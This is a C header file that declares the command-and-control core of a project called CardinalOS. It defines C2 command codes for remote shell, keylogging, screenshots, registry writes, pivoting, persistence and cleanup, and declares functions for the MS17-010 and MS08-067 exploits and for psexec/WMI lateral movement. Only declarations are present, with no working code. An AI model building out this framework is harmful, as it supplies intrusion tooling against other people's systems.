/*
 * CardinalOS - C2 Core
 * Command and Control functionality integrated into kernel
 */

#ifndef C2_CORE_H
#define C2_CORE_H

#include "../kernel/kernel.h"

// C2 Configuration
#define C2_DEFAULT_PORT 4444
#define C2_MAX_CLIENTS 256
#define C2_BUFFER_SIZE 4096

// C2 Command types
typedef enum {
    CMD_SHELL = 0x01,
    CMD_UPLOAD = 0x02,
    CMD_DOWNLOAD = 0x03,
    CMD_EXECUTE = 0x04,
    CMD_SCREENSHOT = 0x05,
    CMD_KEYLOG = 0x06,
    CMD_PROCESS_LIST = 0x07,
    CMD_PROCESS_KILL = 0x08,
    CMD_REGISTRY_READ = 0x09,
    CMD_REGISTRY_WRITE = 0x0A,
    CMD_NETWORK_SCAN = 0x0B,
    CMD_EXPLOIT_RUN = 0x0C,
    CMD_PIVOT = 0x0D,
    CMD_PERSISTENCE = 0x0E,
    CMD_CLEANUP = 0x0F,
    CMD_DISCONNECT = 0xFF
} c2_command_t;

// C2 Client session
typedef struct {
    uint32_t id;
    uint32_t ip_addr;
    uint16_t port;
    uint64_t connect_time;
    bool active;
    char hostname[64];
    char username[32];
    char os_info[128];
} c2_session_t;

// C2 Core functions
void c2_core_init(void);
void c2_server_start(void);
void c2_server_stop(void);
void c2_handle_client(c2_session_t* session);
void c2_send_command(uint32_t session_id, c2_command_t cmd, const char* data, size_t len);
void c2_list_sessions(void);
void c2_interact_session(uint32_t session_id);

// Exploit integration
void c2_exploit_ms17_010(uint32_t target_ip);
void c2_exploit_ms08_067(uint32_t target_ip);
void c2_exploit_custom(const char* exploit_name, uint32_t target_ip);

// Lateral movement
void c2_lateral_psexec(uint32_t target_ip, const char* username, const char* password);
void c2_lateral_wmi(uint32_t target_ip, const char* username, const char* password);

// Persistence
void c2_install_persistence(void);
void c2_remove_persistence(void);

#endif // C2_CORE_H
